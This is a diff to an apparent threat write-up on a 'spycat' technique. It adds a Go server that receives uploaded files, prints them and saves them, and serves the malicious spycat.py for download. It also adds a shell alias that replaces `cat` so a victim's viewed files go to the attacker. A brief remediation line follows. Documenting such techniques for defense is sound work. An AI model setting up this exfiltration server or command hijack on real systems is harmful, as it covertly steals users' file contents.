@@ -35,7 +35,53 @@ It writes the output to a log file `log.txt`.
 Its composition is as such...
 
 ```
+package main
 
+import (
+  "fmt"
+  "net/http"
+  "log"
+  "os"
+  "bytes"
+  "io"
+)
+
+
+func ReceiveFile(w http.ResponseWriter, r *http.Request) {
+    r.ParseMultipartForm(32 << 20) // limit your max input length!
+    var buf bytes.Buffer
+    file, header, err := r.FormFile("file")
+    if err != nil {
+        panic(err)
+    }
+    defer file.Close()
+    //name := strings.Split(header.Filename, ".")
+    name := header.Filename
+    fmt.Printf("File name %s\n", name)
+    io.Copy(&buf, file)
+    contents := buf.String()
+    fmt.Println(contents)
+    os.WriteFile(name, buf.Bytes(), 0600)
+    buf.Reset()
+    return
+}
+
+
+func handler(w http.ResponseWriter, r *http.Request) {
+  switch r.Method {
+  case "POST":
+    ReceiveFile(w, r)
+  default:
+    fmt.Fprintf(w, "Hello world")
+  }
+}
+
+
+func main() {
+  fmt.Println("Starting Server")
+  http.HandleFunc("/", handler)
+  log.Fatal(http.ListenAndServe(":9999", nil))
+}
 
 ```
 
@@ -45,8 +91,13 @@ As a bonus let's add another endpoint which will simply allow for downloading th
 
 GET request
 ```
-
+  case "GET":
+    filename := "spycat.py"
+    body, _ := os.ReadFile(filename)
+    fmt.Fprintf(w, string(body[:]))
 ```
+
+Full script can be found in the `examples` directory in `server.go`.
 
 This script can be downloaded using any HTTP delivery mechanism,
 for testing try it as CURL
@@ -67,6 +118,7 @@ Create an alias that points the normal `cat` command to the malicious version.
 alias cat="python <absolute_path_to_file>/spycat.py"
 ```
 
+Now whenever the Vicitim `cat`s a file the content will be displayed to there terminal as well as sent to the Attacker.
 
 ## Remediation
 * Read this blogpost, ie ingest this information into TIP platform (URL, filehash)
